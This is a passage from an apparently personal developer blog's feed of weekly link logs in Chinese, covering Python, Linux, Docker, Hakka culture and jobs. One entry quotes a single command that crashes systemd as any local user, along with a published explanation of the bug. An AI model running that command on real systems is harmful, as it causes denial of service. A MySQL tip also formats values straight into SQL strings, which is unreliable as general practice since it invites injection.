&lt;li&gt;Welcome feedbac and patches  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;其他的 tool 只能測量 function level，&lt;br /&gt;
但 SkyPat 可以測量 block level。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;目前還是非常初步的產品，&lt;br /&gt;
也歡迎使用者、貢獻者開 Issues 跟 Pull Request，&lt;br /&gt;
一起討論也很歡迎。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/googletest"&gt;GitHub - google/googletest: Google Test&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Skymizer"></category><category term="Cat System Workshop"></category><category term="Meetup"></category><category term="C++"></category><category term="Performance"></category><category term="Unit-test"></category><category term="framework"></category></entry><entry><title>Y2016W40</title><link href="https://blog.m157q.tw/posts/2016/10/10/y2016w40/" rel="alternate"></link><published>2016-10-15T23:12:57+08:00</published><updated>2016-10-15T23:12:57+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-10-10:posts/2016/10/10/y2016w40/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://enginechang.logdown.com/posts/944578"&gt;如何克服低潮期&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇根本我近期的心情寫照啊  &lt;/li&gt;
&lt;li&gt;很多時候真的只是在找尋成就感  &lt;/li&gt;
&lt;li&gt;然後以前有追過一陣子 &lt;code&gt;Soft_Job&lt;/code&gt; 版跟 &lt;code&gt;Tech_Job&lt;/code&gt; 版  &lt;/li&gt;
&lt;li&gt;但覺得大多都在秀下限  &lt;/li&gt;
&lt;li&gt;真正值得看的文章大概都會被推爆然後被圈內人分享出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nyllep.wordpress.com/2016/09/30/找不到人一起寫-code/"&gt;因為找不到人一起寫 code ，所以辦了臺灣程式路跑&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的是很有意義的活動，希望臺灣可以有更多年輕一輩貢獻大型的開源專案呀。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f?gi=7a4f7274c1de"&gt;How it feels to learn Javascript in 2016&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JavaScript 的生態圈實在是太恐怖了，根本是每年都在改朝換代。  &lt;/li&gt;
&lt;li&gt;這樣一直瘋狂的重造輪子，如此快速的反覆更迭，真的不是在虛耗嗎？  &lt;/li&gt;
&lt;li&gt;不知道別人如何，但我是完全無法接受這樣的生態，可能我不夠聰明，學新東西的速度不夠快吧。  &lt;/li&gt;
&lt;li&gt;(2016-10-14) 看看這幾天才公開出來，GitHub 上的 stars 數就超越 &lt;a href="https://github.com/npm/npm"&gt;npm&lt;/a&gt; 的 &lt;a href="https://github.com/yarnpkg/yarn"&gt;yarn&lt;/a&gt;，又是一個 JavaScript package management tool 的改朝換代。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://peniwize.wordpress.com/2013/11/17/pair-programming-give-it-a-rest/"&gt;Pair Programming (give it a rest)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇怨念超深，簡單來說就是：「不要跟我說 Pair Programming 多好，我知道有研究證實，但我他媽就是不喜歡啦。幹！」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/11093236/use-logging-print-the-output-of-pprint"&gt;python - Use logging print the output of pprint - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來可以用 &lt;code&gt;pprint.pformat&lt;/code&gt; 來讓 &lt;code&gt;logging&lt;/code&gt; 變好看呀  &lt;/li&gt;
&lt;li&gt;用法大概是像這樣：&lt;code&gt;logging.debug(pprint.pformat(debug_message))&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pala.tw/python-web-crawler/"&gt;Python爬蟲新手筆記&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近非軟體工程師的同事說想要學寫爬蟲，剛好看到一篇寫的還不錯的。  &lt;/li&gt;
&lt;li&gt;(2016-10-15) 實際拿這篇來講給初學寫程式的同事聽的時候發現有些問題：  &lt;ul&gt;
&lt;li&gt;最主要就是環境設定的問題，主要也是有點趕，不然應該用 Docker 的話應該可以稍微簡化，但 Docker 對新手來說應該還是太麻煩，光是要裝 Docker 這件事也是需要點時間，最後還是覺得應該要像今年去 COSCUP 的 Docker 進階工作坊的時候講師用的 &lt;a href="https://www.katacoda.com/"&gt;Katacoda&lt;/a&gt; 這種直接連上網頁就能用的介面應該才是最適合的。  &lt;/li&gt;
&lt;li&gt;然後後面講到用 bs4 拿 tag 的部份突然加入了 &lt;code&gt;input()&lt;/code&gt;, &lt;code&gt;str.format()&lt;/code&gt; 這些沒學過 Python 或沒寫過程式的人就不會知道的東西，其實有點多餘，所以在講這邊的時候我是選擇跳過不講，直接輸入要抓的字串就好。把用 &lt;code&gt;input()&lt;/code&gt; 跟 &lt;code&gt;str.format()&lt;/code&gt; 當成這部份的進階用法這樣。  &lt;/li&gt;
&lt;li&gt;然後用 &lt;code&gt;selinium&lt;/code&gt; 還得額外裝 &lt;code&gt;Phantom.js&lt;/code&gt;，對新手來說也是一個問題，原本想說用 &lt;code&gt;dryscrape&lt;/code&gt; 會不會比較好一點，但後來想到用 &lt;code&gt;dryscrape&lt;/code&gt; 的話其實還是得額外裝 &lt;code&gt;qt5&lt;/code&gt; 相關的東西，也沒比較簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Tetrachrome/subpixel"&gt;Tetrachrome/subpixel: subpixel: A subpixel convnet for super resolution wit&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;透過 TensorFlow 用 Deep Learning 把被馬賽克的圖片還原回原本的圖片，挺酷的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zonble.net/archives/2016_10/1695.php"&gt;PM 的成功之道 | zonble&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;把軟體行業的 Project Manager 扣掉作者不熟的遊戲業後，加上公司規模（大 or 小）與公司性質（專案型 or 產品/服務型）分成了四種類型：  &lt;ul&gt;
&lt;li&gt;小型專案型公司—全能型  &lt;/li&gt;
&lt;li&gt;中、大型專案型公司—業務型 PM  &lt;/li&gt;
&lt;li&gt;小型產品/服務型公司—企業家型 PM  &lt;/li&gt;
&lt;li&gt;大型產品/服務型公司—掠奪型 PM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得敘述的滿中肯的，作者應該四種類型都有見聞過吧。  &lt;/li&gt;
&lt;li&gt;我還是比較喜歡小型公司的感覺啊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan hakka&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=Sa0M_8juOVo&amp;amp;list=PLwItru4bLdHy8I9XTuCrFdToRlGv31eW8&amp;amp;index=8"&gt;『你哭著對我說，桐花裡都是騙人的？好玄的客家節慶。』- 客客客棧 第7集&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來臺灣吧最近出了客家系列啊  &lt;/li&gt;
&lt;li&gt;身為半個客家人我也只知道新丁粄節而已 QQ  &lt;/li&gt;
&lt;li&gt;來把這個系列目前的七集都看一下好了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=rJiokRWb-bo&amp;amp;index=3&amp;amp;list=PLwItru4bLdHy8I9XTuCrFdToRlGv31eW8"&gt;『不打不相識？客家風雲之閩粵械鬥』- 客客客棧 第2集&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來閩粵械鬥的閩粵到後來已經不是以原鄉省籍為區分，而是以語言來區分閩粵啊。  &lt;/li&gt;
&lt;li&gt;以前課本上都沒講啊。  &lt;/li&gt;
&lt;li&gt;想想好像也合理，語言本來就不像行政區有界線。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=47n3nAwvszM&amp;amp;list=PLwItru4bLdHy8I9XTuCrFdToRlGv31eW8&amp;amp;index=4"&gt;『太前衛啦！讓你童年崩壞的客家音樂？！』- 客客客棧 第3集&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;十八摸www  &lt;/li&gt;
&lt;li&gt;七言四句  &lt;/li&gt;
&lt;li&gt;九腔十八調  &lt;/li&gt;
&lt;li&gt;客家本色  &lt;/li&gt;
&lt;li&gt;林生祥  &lt;/li&gt;
&lt;li&gt;羅文裕  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=HEo3yYeg6rc&amp;amp;index=7&amp;amp;list=PLwItru4bLdHy8I9XTuCrFdToRlGv31eW8"&gt;『沒嘗過客家菜也想當吃貨？』- 客客客棧 第6集&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「好客心、好客情、接待好客人」、桐花、紙傘、花布、藍杉，其實跟客家文化沒什麼關係。  &lt;/li&gt;
&lt;li&gt;客家小炒原先是過年的剩菜剩飯一起大鍋炒，結果意外發現很好吃。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://toggl.com/programming-princess"&gt;How To Save The Princess In 8 Programming Languages&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JavaScript, C, C#, Java, Lisp, Golang, Pascal, PHP 都被婊了一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;twitter&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q/status/784610434854813697"&gt;"用推特一陣子以後會發現&lt;br /&gt;
有一種的推友（以下簡稱為這些人）&lt;br /&gt;
常常看到這些人被轉出來的推都覺得好讚&lt;br /&gt;
因此而 follow 這些人&lt;br /&gt;
但一陣子後卻發現&lt;br /&gt;
這些人平時發的推其實我不那麼感興趣&lt;br /&gt;
因此而 unfollow&lt;br /&gt;
但每次這些人被轉出來的推我依然覺得很讚&lt;br /&gt;
我把這稱為「非一度空間型推友」"&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;其實後來發現應該講「非一度分隔型堆友」  &lt;/li&gt;
&lt;li&gt;畢竟&lt;a href="https://zh.wikipedia.org/zh-tw/%E5%85%AD%E5%BA%A6%E5%88%86%E9%9A%94%E7%90%86%E8%AE%BA"&gt;六度分隔理論&lt;/a&gt;的原文是 Six Degrees of Separation，所以用六度分隔是比較接近原意的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="hakka"></category><category term="joke"></category><category term="medium"></category><category term="twitter"></category><category term="programming"></category><category term="python"></category><category term="software engineering"></category><category term="taiwan"></category></entry><entry><title>Y2016W39</title><link href="https://blog.m157q.tw/posts/2016/10/03/y2016w39/" rel="alternate"></link><published>2016-11-10T11:35:08+08:00</published><updated>2016-11-10T11:35:08+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-10-03:posts/2016/10/03/y2016w39/</id><summary type="html">&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2016/09/bringing-Pokemon-GO-to-life-on-Google-Cloud.html"&gt;Google Cloud Platform Blog: Bringing Pokémon GO to life on Google Cloud&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不是技術文，算是有點推銷自家 GCP 的概念吧，就「你們玩的 Pokémon GO 背後用的可是我們家的服務喔」的感覺。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2243-rebase-and-merge-pull-requests"&gt;Rebase and merge pull requests&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub 把 Rebase 這個選項加到 Merge Pull Request 裏面了  &lt;/li&gt;
&lt;li&gt;除了原本預設的 &lt;code&gt;--no-ff&lt;/code&gt; merge 之外，還多了個 squash and merge 跟 rebase and merge 的選項  &lt;/li&gt;
&lt;li&gt;算是給覺得 merge 一堆 branch 會把 base branch 的 graph 搞得很亂的而喜歡用 rebase 把 branch 扁平化的那派人有個選項吧  &lt;/li&gt;
&lt;li&gt;不過我個人覺得 rebase 會把 base branch 搞的很散亂，個人是習慣在 merge 到 base branch 之前，如果有需要的話，自己先 rebase 整理一下，發 PR merge 到 base branch 還是習慣用預設的 merge，比較容易一目了然這個 branch 到底做了哪些事，可能是因為我目前碰的 repo 的規模都不夠大吧？ branch 太多的話，這個方法應該是真的會看到很亂的一堆 branches  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/LCTT/TranslateProject"&gt;LCTT/TranslateProject: Linux 中國翻譯項目&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國一群人發起的專門翻譯跟 Linux 相關文章的小組  &lt;/li&gt;
&lt;li&gt;裏面蒐集了許多不錯的文章  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://linux.cn/"&gt;Linux.中国-开源社区&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最近在用的 Arch Linux 筆電遇到的問題  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://askubuntu.com/questions/584636/kidle-inject-causing-very-high-load"&gt;14.10 - kidle_inject causing very high load - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://askubuntu.com/questions/482307/kidle-inject-uses-cpu-power-without-apparent-reason"&gt;14.04 - kidle_inject uses cpu power without apparent reason - Ask Ubuntu&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來是 &lt;code&gt;intel_powerclamp&lt;/code&gt; 這個 kernel module 的問題  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;sudo rmmod intel_powerclamp&lt;/code&gt; 把它暫時先拔掉有解決這問題  &lt;/li&gt;
&lt;li&gt;拿掉以後耗電也沒特別快，所以應該還行啦。  &lt;/li&gt;
&lt;li&gt;順便記一下 &lt;code&gt;intel_powerclamp&lt;/code&gt; 這個 driver 的文件網址，畢竟有稍微看了一下。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kernel.org/doc/Documentation/thermal/intel_powerclamp.txt"&gt;https://www.kernel.org/doc/Documentation/thermal/intel_powerclamp.txt&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2016/09/linux-tail-follow-file-rotate-2016/"&gt;Linux tail 遇到 file rotate 要如何持續追蹤讀取&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來用 &lt;code&gt;tail -F&lt;/code&gt; 比 &lt;code&gt;tail -f&lt;/code&gt; 好呀  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;tail -F&lt;/code&gt; 在遇到 log file rotation 的時候仍然可以持續追蹤，但 &lt;code&gt;tail -f&lt;/code&gt; 就不會了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.agwa.name/blog/post/how_to_crash_systemd_in_one_tweet"&gt;How to Crash Systemd in One Tweet&lt;/a&gt;  &lt;blockquote&gt;
&lt;p&gt;The following command, when run as any user, will crash systemd:&lt;br /&gt;
&lt;code&gt;NOTIFY_SOCKET=/run/systemd/notify systemd-notify ""&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;這篇解釋文章解釋了為何會造成這樣的原因：  &lt;blockquote&gt;
&lt;p&gt;The bug is remarkably banal. The above systemd-notify command sends a zero-length message to the world-accessible UNIX domain socket located at /run/systemd/notify. PID 1 receives the message and fails an assertion that the message length is greater than zero. Despite the banality, the bug is serious, as it allows any local user to trivially perform a denial-of-service attack against a critical system component.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql, gae&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/5664310/mysqldb-python-raw-query-and-customized-order-by"&gt;MySQLdb, Python raw query and customized ORDER BY - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒記錯的話是用 &lt;a href="https://pypi.python.org/pypi/MySQL-python/1.2.5"&gt;MySQL-python 1.2.5 : Python Package Index&lt;/a&gt; 遇到的問題  &lt;/li&gt;
&lt;li&gt;就是 &lt;code&gt;cursor.execute(comamnd, params)&lt;/code&gt; 在遇到 &lt;code&gt;ORDER BY&lt;/code&gt; 的時候，把參數放在 &lt;code&gt;params&lt;/code&gt; 會有問題。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;cursor.execute()&lt;/code&gt; 的用法是這樣：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;command = "SELECT * FROM table ORDER BY %s %s"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;params = ['avg', 'DESC']&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;要直接把 &lt;code&gt;params&lt;/code&gt; 寫死在 &lt;code&gt;command&lt;/code&gt; 裏面，就沒問題。  &lt;ul&gt;
&lt;li&gt;像這樣 &lt;code&gt;command = "SELECT * FROM table ORDER BY %s %s" % ('avg', 'DESC')&lt;/code&gt;，然後 &lt;code&gt;params&lt;/code&gt; 直接留空。  &lt;/li&gt;
&lt;li&gt;也就是說 &lt;code&gt;execute()&lt;/code&gt; 在把 &lt;code&gt;params&lt;/code&gt; 代換到 &lt;code&gt;command&lt;/code&gt; 的時候是有問題的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為 Google App Engine Standard Environment 上，預設裝的 MySQLdb package (在 &lt;code&gt;app.yaml&lt;/code&gt; 的 &lt;code&gt;libraires:&lt;/code&gt; 設定的）就是這個已經在 2014 年就停止更新的 package.  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/MySQL-python"&gt;https://pypi.python.org/pypi/MySQL-python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/farcepest/MySQLdb1"&gt;https://github.com/farcepest/MySQLdb1&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;然後這個 repo 只有支援 Python 2，而且又停止更新，所以後來就有人 fork 出來並加上了 Python 3 和 pypy 的 support.  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/mysqlclient"&gt;https://pypi.python.org/pypi/mysqlclient&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyMySQL/mysqlclient-python"&gt;https://github.com/PyMySQL/mysqlclient-python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;所以如果是用 Python 3 寫 Django 又用 MySQL db 的話，現在都會建議裝這個。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip install mysqlclient&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.storm.mg/lifestyle/159818"&gt;自學寫程式不到三年，24歲的他靠「求職天眼通」一戰成名-求職｜政大｜求職天眼通｜古宗禎｜資訊不對稱-風傳媒-數位時代&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來年紀跟我一樣啊... 看看人家再看看我自己 真的要好好加油了 QQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://eng.uber.com/pyflame/"&gt;Pyflame: Uber Engineering's Ptracing Profiler for Python - Uber Engineering&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/uber/pyflame"&gt;uber/pyflame: Python flame graph tool.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Uber 出的 Python Profiler，好像不錯，之後有機會可以拿來用用看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://outofmemory.cn/code-snippet/4092/python-json-charset-type"&gt;为程序员服务&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今天被這篇拯救了  &lt;/li&gt;
&lt;li&gt;要在 python 的 &lt;code&gt;json&lt;/code&gt; module 顯示中文的話，必須要開啟這個選項  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ensure_ascii=False&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;否則預設只會看到中文被轉成 unicode  &lt;/li&gt;
&lt;li&gt;Python 2 的中文問題對我來說始終是個難題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="gae"></category><category term="gcp"></category><category term="github"></category><category term="linux"></category><category term="mysql"></category><category term="programmer"></category><category term="python"></category></entry><entry><title>Y2016W38</title><link href="https://blog.m157q.tw/posts/2016/09/26/y2016w38/" rel="alternate"></link><published>2016-11-04T02:15:26+08:00</published><updated>2016-11-04T02:15:26+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-09-26:posts/2016/09/26/y2016w38/</id><summary type="html">&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://amir.rachum.com/blog/2013/07/13/django-querysets-fucking-awesome-yes/"&gt;Django QuerySets: Fucking Awesome? Yes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就最近接手了一個公司內的專案，裡頭大量使用了 Django 的 QuerySet。  &lt;/li&gt;
&lt;li&gt;找到這篇，覺得講的還不錯，所以存個檔（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/09/docker-cache-on-travis/"&gt;在 Travis 實現 Docker Cache&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這好像可以用來解決之前用 Travis 自動上版到 GKE 的時候 build image 都要很久的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/how2dock/docbook"&gt;how2dock/docbook: Sample code and Vagrant files for O'Reilly Docker cookbook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;歐萊禮系列的《Docker 錦囊妙計》中的範例程式碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;firefox&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.servethehome.com/firefox-is-eating-your-ssd-here-is-how-to-fix-it/"&gt;Firefox is eating your SSD - here is how to fix it&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;預設每 15 秒就會把 session 存入硬碟，於是造成硬碟寫入的 loading 非常高，對 SSD 這種寫入次數有限的東西非常傷，文中有提供解法。  &lt;/li&gt;
&lt;li&gt;開啟 &lt;code&gt;about:config&lt;/code&gt; 頁面，把 &lt;code&gt;browser.sessionstore.interval&lt;/code&gt; 從預設的 &lt;code&gt;15000&lt;/code&gt; (15 秒) 改成 &lt;code&gt;1800000&lt;/code&gt; (30 分鐘) 後，硬碟寫入的 loading 明顯降低了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli, htop&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/180711/what-exactly-do-the-colors-in-htop-status-bars-mean"&gt;linux - What exactly do the colors in htop status bars mean? - Server Fault&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;之前看 htop 都只有看數字而已，於是查了一下 CPU 跟 RAM 的 status bar 中不同顏色代表什麼意思，節錄一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Hitting &lt;code&gt;F1&lt;/code&gt; or &lt;code&gt;h&lt;/code&gt; will show you the key. But for reference, the default colors are:  &lt;/p&gt;
&lt;p&gt;CPU:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Blue = Low priority threads  &lt;/li&gt;
&lt;li&gt;Green = Normal priority threads  &lt;/li&gt;
&lt;li&gt;Red = Kernel threads  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Memory:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Green = Used memory  &lt;/li&gt;
&lt;li&gt;Blue = Buffers  &lt;/li&gt;
&lt;li&gt;Yellow/Orange = Cache  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are a couple of different color-schemes available, you can see them through hitting &lt;code&gt;F2&lt;/code&gt;.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1474342684.A.3BA.html"&gt;[徵才] Opera TV: C   Developers with Linux - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來那個做瀏覽器的 Opera 在內湖有辦公室啊  &lt;/li&gt;
&lt;li&gt;月薪 100k 起跳還算不錯耶，雖然還是比國外的便宜就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.evanlin.com/developer-after-40/"&gt;[好文共賞] Being A Developer After 40 (如何在四十歲後繼續從事軟體開發)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的翻譯文章，一個國外的、具有 18 年開發經驗的開發者的分享，期許自己也能像他一樣，在寫程式這方面努力不懈。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://github.com/crazyguitar/pysheeet"&gt;Python Cheatsheet https://www.pythonsheets.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Python 小抄，整理的還不算少，無聊的時候可以看看。  &lt;ul&gt;
&lt;li&gt;網站的部份在這： &lt;a href="https://www.pythonsheets.com/"&gt;https://www.pythonsheets.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;順便整理幾個類似的文章在這邊備忘好了  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html"&gt;Code Like a Pythonista: Idiomatic Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://jeffknupp.com/blog/2012/10/04/writing-idiomatic-python/"&gt;Writing Idiomatic Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python-guide.org/en/latest/"&gt;The Hitchhiker’s Guide to Python! — The Hitchhiker's Guide to Python&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dongwm.com/archives/liao-liao-pythonmian-shi-zhe-jian-shi-er/"&gt;聊聊 python 面試這件事兒 - 小明明 s à domicile&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還滿不錯的一篇關於 Python 面試的文章，有作者自己的心得還有經驗分享，以及最後有分享一些 Python 面試題目的連結。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一次面試被電的部份  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;他们觉得我买了好多书, 想看想学的很多, 但是都没有深入. 建议我砍掉一半的兴趣, 把这些时间专注于做其中的几件  &lt;/li&gt;
